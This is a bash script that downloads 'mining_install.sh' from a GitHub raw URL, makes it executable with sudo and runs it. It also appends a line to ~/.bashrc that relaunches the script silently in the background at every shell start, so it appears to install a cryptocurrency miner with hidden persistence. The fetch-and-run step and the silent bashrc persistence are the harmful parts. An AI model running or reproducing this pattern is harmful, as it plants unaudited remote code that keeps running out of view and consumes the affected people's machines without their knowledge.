#!/bin/bash

# Clean up old file
rm -rf mining_install.sh

# Download mining script with retry mechanism
echo "Downloading mining_install.sh..."
download_success=false

for i in {1..3}; do
    echo "Download attempt $i/3..."

    if curl -sSL https://raw.githubusercontent.com/phambaonam/nexus/main/mining_install.sh -o mining_install.sh; then
        # Check if file was downloaded and not empty
        if [ -f "mining_install.sh" ] && [ -s "mining_install.sh" ]; then
            echo "✓ Download successful ($(wc -c < mining_install.sh) bytes)"
            sudo chmod +x ./mining_install.sh
            download_success=true
            break
        else
            echo "✗ Downloaded file is empty"
            rm -f mining_install.sh
        fi
    else
        echo "✗ Download failed, attempt $i/3"
    fi

    if [ $i -lt 3 ]; then
        echo "Retrying in 2 seconds..."
        sleep 2
    fi
done

# Final check
if [ "$download_success" = false ]; then
    echo "Error: Failed to download mining_install.sh after 3 attempts"
    echo "Please check:"
    echo "1. Internet connection: ping google.com"
    echo "2. URL exists: https://raw.githubusercontent.com/phambaonam/nexus/main/mining_install.sh"
    echo "3. GitHub accessibility: curl -I https://github.com"
    exit 1
fi

echo "Successfully downloaded and configured mining_install.sh"

if ! grep -Fxq 'bash "$HOME/mining_install.sh" &>/dev/null &' ~/.bashrc; then
    echo 'bash "$HOME/mining_install.sh" &>/dev/null &' >> ~/.bashrc
    $HOME/mining_install.sh
else
    echo "mining_install.sh already exists in ~/.bashrc"
fi